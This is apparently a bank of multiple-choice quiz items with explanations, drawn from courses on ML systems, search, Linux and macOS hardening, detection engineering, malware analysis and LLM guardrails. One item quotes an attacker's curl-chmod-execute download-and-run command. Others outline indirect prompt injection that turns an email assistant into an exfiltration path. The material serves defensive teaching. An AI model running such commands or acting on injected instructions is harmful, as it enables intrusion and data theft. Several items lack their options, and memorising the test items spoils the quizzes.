courseTitle: Latent reasoning: chain of continuous thought (Coconut)
lessonTitle: Why superposition works: continuous thoughts and graph reachability
question: A graph has 30 nodes and diameter 4. In Zhu et al.'s construction, how many continuous thoughts suffice to answer a reachability question about it?
options: 30, one per node
900, one per pair of nodes
5, because log2 of 30 is about 4.9
4, one per step of the diameter
explain: Each thought expands the reachable set by one step along every branch at once, so after D = 4 thoughts every reachable node is in the superposition. 900 echoes the O(n^2) best-known bound for discrete CoT, and 30 is what listing nodes one at a time could need.

courseTitle: Learned indexes: replacing B-tree search with a fitted model
lessonTitle: An index is a model: predicting where a key sits
question: Using the same line and bounds (min_err = -1, max_err = +1), you look up key 30, which is not stored. f(30) = 5.41. Which positions do you search, and what lower_bound do you return?
options: Positions 4 to 6; the first key >= 30 is not there, so return not found
Positions 4 to 6; return position 6, the last slot in the window, which holds 26
Only position 5, because the error bound is for stored keys
Positions 4 to 6, then continue right: 41 at position 7 is the lower_bound
explain: The prediction rounds to 5, so the window is 4 to 6, holding 21, 24 and 26, all smaller than 30. The answer sits just past the window edge at position 7. Bounds measured on stored keys say nothing certain about absent keys, so when the search ends at a window boundary you must extend it. Kraska et al. describe exactly this fix.

courseTitle: Learned indexes: replacing B-tree search with a fitted model
lessonTitle: Inserts, disks and when a learned index pays off
question: Your service stores immutable sorted files that are rewritten by background compaction, and lookups are read-heavy. Which learned index design fits most naturally?
options: An ALEX-style updatable index, because data changes over time
A one-pass, error-bounded index (RadixSpline or PGM-style) rebuilt during each compaction
A single deep neural network trained once and never retrained
None: learned indexes cannot be used with files on disk
explain: Each file is written once in sorted order and then never modified, so the model never goes stale for that file. A single-pass build during the merge costs little extra, which is exactly the argument the RadixSpline paper makes for LSM trees.

courseTitle: Learned sparse retrieval with SPLADE
lessonTitle: Training: ranking loss plus the FLOPs regularizer
question: Two terms have the same weight 0.3 in a document. Term A appears in 1 document of the batch, term B in all of them with similar weights. Under FLOPs, which weight is pushed toward zero faster?
options: A, because rare terms are noise
Both equally, since the weights are equal
B, because its mean weight across the batch is larger, so its gradient 2 a_j / N is larger
Neither; FLOPs only acts on queries
explain: The FLOPs gradient for a weight is proportional to the term's batch mean. B is active everywhere, so its posting list is long and its push is strong. L1 would treat A and B the same.

courseTitle: Learning to rank: from RankNet to LambdaMART
lessonTitle: RankNet: a probability for every pair
question: A pair is correctly ordered with a gap of 6 (sigma = 1). Roughly how big is its push?
options: About 0.0025, close to zero
About 0.5
About 1, the maximum
Exactly 0
explain: Push = 1 / (1 + e^6) = 0.0025. Well-separated, correctly ordered pairs contribute almost nothing, so RankNet focuses on misordered or close pairs. It never reaches exactly 0.

courseTitle: Linear attention and Gated DeltaNet
lessonTitle: The state is a key-value memory, and it fills up
question: A head has $d_k=64$. A prompt states 500 different key facts, each with its own key direction. What happens to recall under plain linear attention?
options: Nothing, because 500 tokens is short
Keys cannot all be orthogonal in 64 dimensions, so reads mix many stored values
Only the last 64 facts are kept and older ones are cleanly deleted
The model switches to softmax attention automatically
explain: At most 64 directions can be mutually orthogonal. With 500 associations the overlaps $k_i^\top k_j$ are nonzero and every read returns a weighted mixture. Nothing is cleanly deleted either: additive memory never forgets.

courseTitle: Linear attention and Gated DeltaNet
lessonTitle: Chunkwise DeltaNet derived: WY form and the UT transform by hand
question: Which step of chunkwise DeltaNet keeps a token-by-token dependency inside a chunk?
options: The forward substitution that solves for T
Computing $QK^\top$ for the chunk
Multiplying $T$ by $V$
Computing the masked intra-chunk output
explain: Row r of T depends on rows 1 to r - 1, so forward substitution is inherently ordered, but it is only a C x C system. Everything else is a dense matmul. Across chunks, the state hand-off is the other sequential part.

courseTitle: Linux for security: users, permissions, processes and logs
lessonTitle: Where things live: the Linux filesystem from a defender's view
question: Which directory would you expect to hold the SSH server's configuration file?
options: /var/log
/proc
/etc
/usr/bin
explain: Configuration local to the machine lives under /etc (the SSH server reads /etc/ssh/sshd_config). /var/log holds logs, /proc is generated live by the kernel, and /usr/bin holds programs.

courseTitle: Linux for security: users, permissions, processes and logs
lessonTitle: sudo and sudoers: controlled, logged use of root
question: What is the main accountability advantage of sudo over sharing the root password for su?
options: sudo is faster
sudo encrypts commands
su cannot run single commands
Each person uses their own password and every command is logged under their name
explain: With su, many people know one secret and logs show only that root did something. sudo authenticates the individual and writes a line per command naming the real user, terminal and command.

courseTitle: Linux for security: users, permissions, processes and logs
lessonTitle: SSH: keys versus passwords, authorized_keys and hardening
question: sshd ignores alice's authorized_keys even though the key is correct. alice's home directory is mode 777. Why?
options: Ed25519 keys require mode 777
StrictModes refuses keys when the user's files or home directory are writable by others
The file must be owned by root
sshd only reads keys from /etc/ssh
explain: With a world-writable home directory any user could replace .ssh/authorized_keys. StrictModes (default yes) checks ownership and modes before trusting the file, so fix the permissions: home not writable by others, .ssh 700, authorized_keys 600.

courseTitle: Linux for security: users, permissions, processes and logs
lessonTitle: A basic hardening checklist and where to practise
question: You can make one change today on an internet-facing server that still allows SSH passwords and has 30 user accounts. Which change removes the most risk?
options: Set PasswordAuthentication no after giving every user a key
Change the SSH port
Delete /var/log/auth.log to save space
Set umask 000
explain: Thirty passwords means thirty chances that one is weak or reused, and guessing is constant on the internet. Keys remove online guessing entirely. A different port only reduces noise; deleting logs and umask 000 make things worse.

courseTitle: Linux fleet hardening and telemetry: CIS, auditd and eBPF
lessonTitle: Tailoring, exceptions and rolling a baseline out safely
question: Your profile requires `kernel.unprivileged_bpf_disabled = 1`. A host reports 2. Is it compliant?
options: Yes: any non-zero value disables unprivileged BPF, so 2 is at least as strong
Yes: 2 is the stricter value
The sysctl does not exist
No: 2 also disables unprivileged BPF now, but an admin can turn it back on later, while 1 cannot be undone until reboot
explain: Both values block unprivileged bpf() today. The difference is reversibility: 1 is one-way until reboot, 2 can be changed back. Whether to accept 2 is a tailoring decision; a strict check makes you take it on purpose.

courseTitle: Linux fleet hardening and telemetry: CIS, auditd and eBPF
lessonTitle: Writing audit rules that answer real questions
question: Why is `-e 2` placed as the last rule rather than the first?
options: It makes auditd start faster
It locks the configuration, so every rule must already be loaded before it runs
augenrules requires it alphabetically
It enables the b32 rules
explain: Once the configuration is locked, no rule can be added or removed until reboot. Rules after it would fail to load. augenrules moves the last -e to the bottom for this reason.

courseTitle: Linux fleet hardening and telemetry: CIS, auditd and eBPF
lessonTitle: Linux EDR and fleet telemetry: what sensors see and miss
question: A host has a userland rootkit that hooks libc to hide a process. Which source still shows that process?
options: ps run in an SSH session on that host
ls /proc in an SSH session on that host
netstat on that host
An eBPF sensor recording sched_process_exec in the kernel
explain: The hooked library lies to programs that call it, and shells spawned on the host are injected. The eBPF program reads kernel events, which the userland hooks never touch.

courseTitle: Linux fleet hardening and telemetry: CIS, auditd and eBPF
lessonTitle: Patching a fleet: automatic updates, restarts, reboots and rings
question: Why might a team running eBPF sensors still prefer a scheduled reboot to a livepatch for a non-urgent kernel fix?
options: Livepatch requires disabling lockdown
Livepatch only works on ARM
Per the kernel docs, kprobes in the original function are ignored once calls are redirected, so a sensor probing a patched function can silently stop seeing it
Reboots are faster than livepatches
explain: The livepatch documentation lists this limitation. It is a good reason to livepatch only when the risk demands it and to reboot into the fixed kernel in the next window.

courseTitle: LLM-as-judge for relevance labeling
lessonTitle: Why relevance labels are the bottleneck of search evaluation
question: A team has 2,000 queries and 40 ranker variants per week, and wants NDCG@10 for all of them. What is the main reason they consider an LLM judge?
options: NDCG cannot be computed from human labels
Each new variant surfaces unjudged documents, and human labels for all of them are too slow and costly
LLM labels are always more accurate than human labels
LLMs can compute NDCG directly without labels
explain: NDCG needs a grade for every returned document. New rankers keep surfacing unjudged documents, so the labelling bill grows with every experiment. The LLM judge makes that bill small. Accuracy is not automatic: it has to be checked against gold labels.

courseTitle: LLM-as-judge for relevance labeling
lessonTitle: Judge biases: position, verbosity and self-preference
question: A colleague adds an "include more detail" step to the generator in a RAG system, and the LLM judge's preference for its answers rises from 50% to 70%. Which explanation should you rule out before celebrating?
options: Verbosity bias: the judge may be rewarding length rather than better content
Position bias in the generator
Kendall's tau is too low
The gold set is too large
explain: Zheng et al.'s repetitive list attack shows weaker judges preferring padded answers over 90% of the time. Check with length-controlled comparisons or human spot checks before attributing the gain to quality.

courseTitle: Evaluating generated text: metrics, LLM judges and human preference
lessonTitle: LLM judges for generation: modes, biases and fixes
question: Which mitigation targets position bias specifically?
options: Using a judge from a different model family
Fitting a tanh length term
Evaluating both orders and combining the results
Adding a reference answer to the prompt
explain: Balanced Position Calibration (Wang et al.) and swap-and-tie (Zheng et al.) run both orders so that position effects cancel or show up as ties. A different-family judge targets self-preference; the length term targets verbosity.

courseTitle: Guardrails for LLM applications
lessonTitle: Threat model: how an LLM app gets attacked or goes wrong
question: An email assistant reads the user's inbox and can send emails. Which threat is the most direct route to it sending data to an attacker?
options: A jailbreak typed by the user
Hallucinated claims in a summary
Indirect prompt injection in an incoming email
A slow model response
explain: The attacker only needs to send an email: the assistant reads it as context, and injected instructions plus a send-email tool give a path to exfiltration. A user jailbreak needs the user to be the attacker; hallucination does not move data out.

courseTitle: Guardrails for LLM applications
lessonTitle: Measuring a guard, and why no guard is complete
question: A vendor reports their jailbreak detector blocks 99% of attacks in a public benchmark. What is the most important question before relying on it?
options: Which GPU it runs on
Whether it uses a transformer
How it performs against adaptive attacks crafted against it, and what its false positive rate is on your traffic
Whether the benchmark is in English
explain: Static benchmarks measure known attacks. Studies such as Zou et al. and Hackett et al. show optimized or obfuscated inputs evade guards, and the FPR on your own base rate decides how many real users get blocked.

courseTitle: LLM inference systems and KV-cache memory management
lessonTitle: KV cache accounting: from bytes per token to batch size
question: All requests are about 2,000 tokens long and memory-bound by KV. Which single change roughly doubles the number of sequences that fit?
options: Storing the KV cache in FP8 instead of BF16
Doubling max_num_seqs
Doubling the block size from 16 to 32
Enabling chunked prefill
explain: FP8 halves b in the formula, so twice as many tokens fit in the same pool. Raising max_num_seqs only lifts a cap that is not binding; block size changes waste per sequence by a few tokens; chunked prefill changes step composition, not memory per token.

courseTitle: LLM inference systems and KV-cache memory management
lessonTitle: Who goes next: priority, fairness and length-aware scheduling
question: Why does VTC lift a newly active client's counter to the smallest counter in the queue instead of leaving it at its old, low value?
options: So the client cannot spend service it did not use while idle and then lock out the clients that kept the server busy
Because counters must be reset to zero after every request
To make the newcomer wait until everyone else is served
Because prompt tokens are charged twice
explain: A client that was idle for an hour would otherwise have a far smaller counter and win every admission until it caught up, starving the others. Lifting to the queue's minimum puts it on equal footing immediately, which is the paper's "credits cannot be carried over" rule.

courseTitle: LLM prompting and structured output: from prompts to masked logits
lessonTitle: Why asking nicely for JSON is not enough
question: A pipeline makes 20 LLM calls per job; each yields usable JSON 98 percent of the time, independently. Roughly what fraction of jobs finish without any bad output?
options: 98 percent
about 80 percent
about 67 percent
about 40 percent
explain: 0.98 to the 20th power is 0.668. Per-call reliability that sounds high compounds quickly across chained calls, which is why format errors matter far more in pipelines than in a chat window.

courseTitle: LLM query parsing: natural language to structured filters
lessonTitle: Designing the filter schema: enums, ranges and nulls
question: Which representation of the city should the LLM output for an index with 40000 distinct city IDs?
options: An enum listing all 40000 city IDs so decoding is constrained
The city as a free string, mapped to a canonical ID by a lookup in code
An integer GeoNames ID, since models memorize popular IDs
Nothing: leave cities in the residual text for the embedding to handle
explain: GeoNames is a public geographic database that gives each place a numeric ID. A huge enum exceeds documented schema limits and costs tokens on every request, and models do not reliably know arbitrary IDs, so an invented ID would look valid. Leaving the city in text turns a hard constraint back into a soft one. Extract the surface string and normalize it deterministically.

courseTitle: Latency and cost tradeoffs for LLM reranking
lessonTitle: Anatomy of one rerank call: tokens in, tokens out, two phases
question: With the course assumptions, a prompt of 2,000 tokens produces 60 output tokens. Roughly how is the call time split?
options: About 250 ms prefill and 885 ms decode, so decode dominates
About 1,000 ms prefill and 135 ms decode, so prefill dominates
Equal, since every token costs the same time
Almost all decode, because prefill is processed token by token too
explain: Prefill: 2,000 / 8,000 s = 250 ms. Decode: 59 steps x 15 ms = 885 ms. Prefill processes the prompt in one parallel step; decode cannot.

courseTitle: Latency and cost tradeoffs for LLM reranking
lessonTitle: Prefix caching, truncation and smaller candidate lists
question: You run pointwise reranking on a self-hosted model with prefix caching enabled, but see no cache hits. Your prompt is: passage, then query, then instruction. What is the fix?
options: Raise the cache size
Lower the temperature
Send the passages in a single batch
Put the instruction first, then the query, then the passage
explain: Prefix caching matches from the first token. With the passage first, every prompt differs immediately. Static instruction, then query, then passage makes the first 120 tokens identical across a query's calls.

courseTitle: LLM as reranker: pointwise, pairwise and listwise prompting
lessonTitle: Pairwise ranking prompting: allpairs, sorting and sliding
question: You rerank N = 20 candidates with PRP-Allpair, asking each pair in both orders. How many LLM calls is that?
explain: There are 20 x 19 / 2 = 190 pairs, and each is asked twice (original and swapped order), so 380 calls. For N = 100 the same formula gives 9,900.

courseTitle: LLM routing and cascades: cheap model or strong model
lessonTitle: Why sending every prompt to the strongest model wastes money
question: Using RouteLLM's blended prices (GPT-4 24.70, Mixtral 0.24 USD per million tokens), a router sends 30% of traffic to GPT-4. What is the blended cost per million tokens?
options: About 7.41, because only the GPT-4 share costs anything meaningful
About 12.47, the same as a 50/50 mix
About 7.58
About 17.36
explain: 0.3 x 24.70 + 0.7 x 0.24 = 7.41 + 0.168 = 7.58. Ignoring the weak model is a fine approximation here (7.41 is close) but not exact. 12.47 is the 50/50 mix and 17.36 corresponds to 70% strong.

courseTitle: LLM routing and cascades: cheap model or strong model
lessonTitle: Learned routers: predict whether the strong model would win
question: Which RouteLLM router does its fitting at inference time instead of during training?
options: The causal LLM classifier
Matrix factorization
The BERT classifier
Similarity-weighted ranking
explain: Similarity-weighted ranking solves a weighted Bradley-Terry problem for each new prompt, weighting training battles by similarity. That is why it needs no training, and also why it was the slowest router to serve.

courseTitle: Local feature matching: Harris, SIFT, ORB and RANSAC
lessonTitle: SIFT: keypoints across scale and a 128-number descriptor
question: Why does SIFT compare a candidate with its neighbors in the adjacent DoG scales and not only in its own image?
options: To speed up detection by skipping pixels
To choose a characteristic scale for the keypoint, so the same region is described after a zoom
To compute the 128-d descriptor
To reject points on edges
explain: Being an extremum across scale as well as space picks the blur level where the structure responds most strongly. That scale travels with the keypoint, so after a 2x zoom the detector picks a 2x larger scale and both images describe the same physical region. Edge rejection is the separate Hessian ratio test.

courseTitle: Lock-free stacks and queues: Treiber, Michael-Scott, Vyukov
lessonTitle: Why a preempted lock holder stalls everyone
question: A queue uses only atomic fetch-add and CAS, no mutex. If a producer is preempted between two of its steps, consumers can never dequeue anything past its slot until it resumes. Is the queue lock-free?
options: Yes, because it uses no locks
Yes, because consumers still return (they report empty)
No, because one stalled thread can prevent all other threads from making progress
No, because fetch-add is not a CAS
explain: The definition is about progress: some operation must complete in finite steps no matter which threads stall. Returning "empty" while items are stuck behind a stalled producer is not progress on the queue's contents. Using atomics instead of mutexes is irrelevant to the definition.

courseTitle: Lock-free stacks and queues: Treiber, Michael-Scott, Vyukov
lessonTitle: Vyukov's bounded MPMC queue: a sequence number per cell
question: Why must the capacity be a power of two in Vyukov's original code?
options: Because CAS only works on power-of-two addresses
So that the cell index is pos & buffer_mask_, a cheap mask that stays consistent as pos grows forever
So that sequence numbers never wrap
Because cache lines are 64 bytes
explain: The constructor asserts buffer_size is a power of two and stores buffer_size - 1 as the mask. Masking only equals pos mod capacity for powers of two. crossbeam lifts the restriction by splitting stamps into an index and a lap instead.

courseTitle: Log parsing and log analytics: templates instead of regex
lessonTitle: How accurate is this really, and by which metric
question: A vendor says their parser reaches 0.95 accuracy on your logs. Which single follow-up question is most likely to change your decision?
options: Which programming language is it written in?
Is that per message or per template, and does correct mean grouped correctly or every token identified correctly?
What similarity threshold did you use?
How many datasets did you average over?
explain: Message-level grouping metrics are dominated by frequent templates: 0.95 is reachable by parsing only the 1 percent of templates that carry 95 percent of the volume. Template-level FGA and the token-exact FTA are far stricter, and Drain's FGA falls from about 0.75 to 0.55 when moving from 2,000-line samples to fully annotated million-line logs. The threshold and the language matter much less than knowing what the number counts.

courseTitle: Logging and detection engineering
lessonTitle: What to log, source by source
question: An attacker signs in with a stolen password, approves their own newly registered MFA device, and reads files in a SaaS (software as a service: a hosted web application) app. No program runs on any company laptop. Which source is most likely to show it?
options: Endpoint process creation logs
The identity provider's sign-in and MFA registration logs
Firewall deny records
DNS query logs
explain: Valid-credential intrusions leave little on endpoints or networks. The identity provider records the unusual sign-in and the new device, which is exactly the signal FireEye, a US security company, followed in 2020 (lesson 16).

courseTitle: Logging and detection engineering
lessonTitle: Time: clocks, time zones and the order of events
question: Which timestamp should a scheduled rule window on to avoid missing late-arriving events?
options: @timestamp only
event.ingested, or overlapping @timestamp windows with duplicate suppression
The analyst's local clock
The PRI field
explain: Windowing on arrival time guarantees every stored event is searched once. Overlapping windows on event time work too, at the price of deduplication.

courseTitle: Logging and detection engineering
lessonTitle: Sigma: one rule format, many SIEMs
question: Why does a rule say `category: process_creation, product: windows` instead of naming Sysmon?
options: Sigma cannot read Sysmon
So one rule applies to any Windows process-creation source; processing pipelines map it to Sysmon, 4688 or an EDR feed per environment
Category is required by Splunk
To lower the rule's level
explain: The abstract logsource is what makes rules portable. The environment-specific mapping lives in the pipeline, not in every rule.

courseTitle: Logging and detection engineering
lessonTitle: Baselines, anomalies and UEBA: how Storm-0558 was caught
question: Which of these is a limit of anomaly detection that Sommer and Paxson identify?
options: It cannot run on network data
It needs Sigma rules
The semantic gap: an alert says something is unusual, not why it is malicious, so analysts must interpret it
It only works on Windows
explain: Unusual is not the same as malicious. Without context the analyst cannot act, which is why anomaly output works best as an investigation lead.

courseTitle: Long context: RoPE scaling, YaRN and Ring Attention
lessonTitle: YaRN: a per-frequency ramp plus attention temperature
question: A colleague implements YaRN by scaling queries by 1.2773 for s = 16 but forgets the keys. What is the effect on the logits?
options: Correct: the temperature is defined on queries only
Logits are unchanged because softmax is scale invariant
Logits are scaled by 1.2773 instead of the intended 1.6314
Logits are scaled by 1.6314 squared
explain: YaRN multiplies both rotated q and k (via cos and sin) by sqrt(1/t) = 0.1 ln 16 + 1 = 1.2773, so the dot product is scaled by 1.2773 squared = 1.6314. Scaling only one side gives just 1.2773. Softmax is shift invariant, not scale invariant.

courseTitle: Long context: RoPE scaling, YaRN and Ring Attention
lessonTitle: Build it: YaRN tables and a four-host ring in NumPy
question: A teammate's ring simulation matches full attention when the mask is off, but with a causal mask 252 of 256 rows are wrong; only the last row of each 64-token block is right. Which block-level rule did they most likely forget?
options: Skipping future blocks (j > i)
Rescaling l and o when the running max grows
Masking the upper triangle inside the diagonal block (j = i)
Passing KV to host i + 1 instead of i - 1
explain: We ran exactly this bug: without the diagonal mask every query sees the later keys of its own block, except the block's last token, which legitimately sees all 64. Forgetting the j > i skip instead corrupts whole blocks (error 1.9 in our run). A wrong rescale would break the unmasked case too.

courseTitle: Looped and recurrent-depth transformers
lessonTitle: What a loop can compute: algorithms, latent thoughts, fixed points
question: Yang et al. train a looped transformer without input injection (Y_(t+1) = M(Y_t), Y_0 = P). What did they observe when running more loops than in training?
options: Error kept falling, because more loops always help
Error was unchanged, because the state had converged
Error grew quickly (diverged) past the trained loop count
The model refused to run more loops
explain: Without re-injecting the prompt, the influence of the start fades and the state drifts once the loop count leaves the trained range. With injection, the end point stays tied to the input, which is the same reason Huginn feeds e into every iteration.

courseTitle: Looped and recurrent-depth transformers
lessonTitle: When looping helps, when it hurts, and the design space
question: For k = 8, Saunshi et al. report open-book QA scores of 33.9 (24 layers), 22.7 (8 layers) and 30.8 (8 layers looped 3x). What is the % Gap?
options: About 24%
About 51%
About 72%
About 136%
explain: (30.8 - 22.7) / (33.9 - 22.7) = 8.1 / 11.2 = 0.72, about 72%, matching the paper's table. The looped model recovers most of the missing parameters' benefit on this context-reasoning group.

courseTitle: LoRA, QLoRA and parameter-efficient fine-tuning
lessonTitle: Counting parameters, choosing targets, merging for free inference
question: You add a rank-8 LoRA to one MLP up-projection of shape 4096 by 11008. How many trainable parameters does that adapter have?
explain: r(d + k) = 8 x (4096 + 11008) = 8 x 15104 = 120,832. 65,536 would be a square 4096 matrix, and 45,088,768 is the full matrix itself.

courseTitle: LoRA, QLoRA and parameter-efficient fine-tuning
lessonTitle: The wider PEFT family, and when LoRA falls short
question: Your LoRA r = 16 on attention only underperforms full fine-tuning on a code instruction set. Which change is most supported by the evidence in this course?
options: Lower the learning rate by 10x
Switch to adapting only Wq
Target all linear layers including the MLP and raise the rank
Initialize B randomly instead of to zero
explain: QLoRA needed all linear layers to match full fine-tuning, and Biderman et al. found MLP modules drive most gains and that code needs high ranks. Their recommendation was a higher learning rate than full fine-tuning, not lower.

courseTitle: Machine unlearning: removing data and knowledge from trained models
lessonTitle: Certified removal: what 'as if retrained' means formally
question: You use Newton-step removal on an L2-regularized least-squares regressor. How much loss perturbation noise do you need for certified removal?
options: The same as for logistic regression, since both are linear models
A lot, because least squares is not differentially private
None: the loss is quadratic, so one Newton step lands exactly on the retrained optimum (epsilon = 0)
It cannot be certified, because the Hessian changes with w
explain: The Newton step uses a local quadratic model of the loss, which is exact for least squares: its Hessian does not depend on w. The gradient residual is exactly zero, so Guo et al. note no perturbation is needed. Logistic loss is not quadratic, which is why it leaves a residual to mask.

courseTitle: Machine unlearning: removing data and knowledge from trained models
lessonTitle: Hidden, not gone: relearning, probing and quantization attacks
question: A lab applies RMU to an open-weight model and publishes near-chance WMDP scores as evidence the model is safe to release. What is the strongest objection?
options: WMDP has too few questions to be meaningful
RMU always destroys general capabilities
With open weights anyone can fine-tune on related data, and RMU did not prevent relearning in the WMDP paper's own fine-tuning experiment
Near-chance scores prove the model was never trained on the data
explain: The WMDP appendix reports that fine-tuning an RMU-unlearned Mistral-7B on the forget corpus recovered performance, and Hu et al. show even benign related data can jog the knowledge back. RMU's stated threat model is a closed model unlearned just before serving, not a public release.

courseTitle: macOS security for defenders
lessonTitle: Quarantine and Gatekeeper: the first-launch check
question: An attacker's instructions tell the victim to run `curl -o /tmp/x https://... && chmod +x /tmp/x && /tmp/x`. Why does Gatekeeper not prompt?
options: Because /tmp is protected by SIP
Because chmod removes the signature
Because Gatekeeper only checks apps from the App Store
Because curl does not set the quarantine attribute, so the launch never invokes Gatekeeper
explain: Apple's DTS notes that curl does not quarantine downloads. Without the attribute the first-launch assessment is never triggered. The binary still needs a valid (even ad hoc) signature to run on Apple silicon, which attackers can add trivially.

courseTitle: macOS security for defenders
lessonTitle: TCC: consent prompts, the databases and who is asking
question: Malware running as the user tries to read `~/Documents/contracts.pdf`. Unix permissions allow it. What decides the outcome?
options: TCC: the malware's process needs the user's consent (or Full Disk Access) for Documents
Nothing: Unix permissions are final
SIP, because Documents is a system folder
Gatekeeper, because the file was downloaded
explain: Documents is TCC-protected on macOS 10.15 or later. The responsible app needs a stored allow for Documents or Full Disk Access; otherwise tccd denies or prompts.

courseTitle: macOS security for defenders
lessonTitle: Unified logging: reading what the Mac recorded
question: Your query returns `opened <private>` where you hoped to see a file path. Why?
options: The log was tampered with
The path was too long
Dynamic strings are redacted by default unless the developer marked them public
The message was at debug level
explain: Apple's documentation: the unified log redacts dynamic strings and objects by default; developers opt in with %{public}. Integers and Booleans are not redacted.

courseTitle: macOS security for defenders
lessonTitle: FileVault, secure boot and startup security
question: A Mac with Apple silicon has FileVault off. A thief removes nothing, just boots it. What protects the data?
options: The data is unencrypted
The thief needs the recovery key
The Secure Enclave refuses to boot
The volume is encrypted, but the key is protected only by the hardware UID, so the Mac unlocks it at boot; only the login password stands in the way
explain: Apple: with FileVault off the volume key is protected only by the hardware UID. The disk is useless in another Mac, but on this Mac nothing cryptographic depends on the user's password.

courseTitle: Malware and reverse engineering
lessonTitle: What malware is, and the families analysts name
question: A file arrives as an email attachment, shows a fake invoice, does not copy itself anywhere, and silently downloads a second program from the internet. Which labels fit best?
options: Worm and wiper
Virus and rootkit
Trojan and loader
Worm and ransomware
explain: It looks benign and does not replicate (trojan), and its job is fetching other malware (loader). A worm would spread to other machines on its own; a virus would infect other files.

courseTitle: Malware and reverse engineering
lessonTitle: Reading x86-64 assembly: registers and core instructions
question: Which register holds a function's integer return value on x86-64?
options: rsp
rcx
rax
rip
explain: rax (or its low half eax) carries the return value. rsp is the stack pointer, rcx carries the first argument on Windows, and rip points at the next instruction.

courseTitle: Malware and reverse engineering
lessonTitle: Command and control: beacons, jitter and Cobalt Strike
question: A Beacon checks in every 300 seconds with 20% jitter. Which set of gaps between check-ins is consistent with Fortra's documentation?
explain: With 20% jitter the documented range is 240 to 300 seconds. Only the first set stays in that window.

courseTitle: Malware and reverse engineering
lessonTitle: Sharing intelligence and writing the analysis report
question: In TLP 2.0, what does TLP:AMBER+STRICT allow?
options: Sharing only within the recipient's own organisation
Public sharing
Sharing with the whole community but not the press
Sharing only with named individuals in the meeting
explain: FIRST's standard: AMBER allows the recipient's organisation and its clients on a need-to-know basis; AMBER+STRICT restricts sharing to the organisation only.

courseTitle: Matryoshka embeddings: one vector, many sizes
lessonTitle: Shortlist then rerank: adaptive retrieval and funnel search
question: Single-shot exact search over 1,281,167 vectors at 2048 dims vs adaptive retrieval with D_s = 16, K = 200, D_r = 2048. Which term dominates the adaptive cost?
options: The rerank: 200 x 2048 = 409,600 multiply-adds
The shortlist scan: 16 x 1,281,167, about 20.5 million multiply-adds
Both are equal by design
Encoding the query, which grows with D_r
explain: The scan touches every vector: 20.5M multiply-adds. The rerank touches only 200 vectors: 0.41M. So the shortlist scan is about 98% of the 20.9M total, and speeding it up (smaller D_s, ANN, binary) gives the biggest win.

courseTitle: Megatron-Core performance: TP, PP, CP, MoE, FP8 and MFU
lessonTitle: Tensor parallelism: column and row splits of the MLP and attention
question: With TP = 8 and a 128,000-token vocabulary, what does the vocabulary-parallel loss move between the 8 GPUs for each token in the forward pass?
options: All 128,000 logits, gathered onto every GPU
The 16,000 logits of each GPU's slice, sent to GPU 0
Nothing, each GPU computes its own loss on its slice
Three scalars through all-reduces: the max, the sum of exponentials and the target logit
explain: The max (MAX all-reduce), the sum of exponentials (SUM) and the target logit from its owner (SUM) are enough to form log sum exp minus the target logit. A per-slice loss would be wrong, because softmax normalizes over the whole vocabulary.

courseTitle: Megatron-Core performance: TP, PP, CP, MoE, FP8 and MFU
lessonTitle: Distributed optimizer and hiding communication behind compute
question: A run with the distributed optimizer and d = 8 data-parallel ranks enables `--overlap-param-gather`. What exactly is overlapped with what?
options: The gradient reduce-scatter with the optimizer step
The all-gather of layer i+1's updated weights with the forward computation of layer i
The pipeline sends with the attention kernels
The Adam update of one shard with the Adam update of another
explain: After the optimizer step each rank has updated only its 1/8 shard, so the full BF16 weights must be all-gathered before use. The flag prefetches the next bucket's gather while the current layers compute. Gradient overlap is the separate --overlap-grad-reduce.

courseTitle: Megatron-Core performance: TP, PP, CP, MoE, FP8 and MFU
lessonTitle: Hands on: plan, launch, profile and checkpoint an MCore run
question: A run trained with TP 4 saves checkpoints in the default distributed-optimizer format (dp_reshardable). It must continue on a cluster where it will use TP 8. What should the team do?
options: Nothing; dp_reshardable checkpoints load under any TP
Convert the checkpoint to Hugging Face format and back
Restart training from scratch, since optimizer state cannot be resharded
Resume once under TP 4 with --dist-ckpt-optim-fully-reshardable and save, then load that checkpoint under TP 8 (optionally dropping the flag later)
explain: dp_reshardable ties the optimizer state to the TP and PP it was saved with, and Megatron's loader stops with an error if they differ. Saving once in the fully reshardable format under the old layout makes the state loadable under TP 8; afterwards the team may return to the faster format. Converting to Hugging Face loses the optimizer state.

courseTitle: Memory forensics
lessonTitle: An image is not a photograph: smear, footprint and checks
question: A socket's creation time in the image is 22 seconds later than the image's SystemTime. Which explanation fits best?
options: The socket was created by the analyst's machine
The clock page was copied before the page holding the socket, because acquisition took tens of seconds
Windows clocks run backwards during dumps
netscan converts times to local time
explain: SystemTime reflects the moment its page was copied, not the end of acquisition. Later pages can hold objects created after that moment.

courseTitle: Memory forensics
lessonTitle: VADs and malfind: finding code that has no file
question: Why are code regions from normally loaded DLLs not reported by malfind?
options: Because DLLs are never executable
Because malfind only scans the kernel
Because the loader encrypts DLLs in memory
They are mapped image files with PAGE_EXECUTE_WRITECOPY protection, which malfind's rule excludes
explain: Image mappings get EXECUTE_WRITECOPY. malfind wants private executable memory or a mapping with some other protection, which normal loading does not create.

courseTitle: Memory forensics
lessonTitle: Cobalt Strike Beacon in memory: finding and reading its configuration
question: Your YARA rules for Beacon match nothing in an image, but netscan shows rundll32.exe with regular HTTPS connections to a rare host. What fits Fortra's documentation?
options: Beacon never runs in rundll32.exe
YARA cannot read memory images
Sleep masks delete the network objects
The Beacon may have been masked by its sleep mask at capture time, so absence of a match is not absence of Beacon
explain: The default sleep mask obfuscates Beacon while sleeping. Pivot to the process's threads, sockets and unmasked code, consider a second capture, and use tools built for masked process dumps.

courseTitle: Memory forensics
lessonTitle: Case: Ivanti Connect Secure, and a memory-first workflow
question: A VPN appliance is confirmed compromised. Following Volexity's advice, what comes first?
options: Wipe and rebuild immediately to stop the attacker
Collect logs, a system snapshot, and memory and disk images before wiping or rebuilding, then hunt for lateral movement
Apply the patch and close the case
Reboot the appliance to clear in-memory implants
explain: Patching and rebuilding do not reveal past compromise, and a reboot destroys memory evidence. Collect first, then contain, then hunt from the device inward.

courseTitle: Memory fragmentation: why freed memory stays used
lessonTitle: Measuring and fixing fragmentation in production
question: A Redis instance reports mem_fragmentation_ratio 2.1, with used_memory 40 MB and RSS 84 MB. What should you do?
options: Probably nothing: 44 MB of absolute overhead is small and includes code and libraries
Enable activedefrag immediately
Restart the instance to reset fragmentation
Lower dirty_decay_ms to 0
explain: The Redis docs warn that a high ratio with only a few megabytes of difference is not an issue: the ratio also counts code, shared libraries and stacks, which dominate a small instance. Check allocator_frag_bytes before acting.

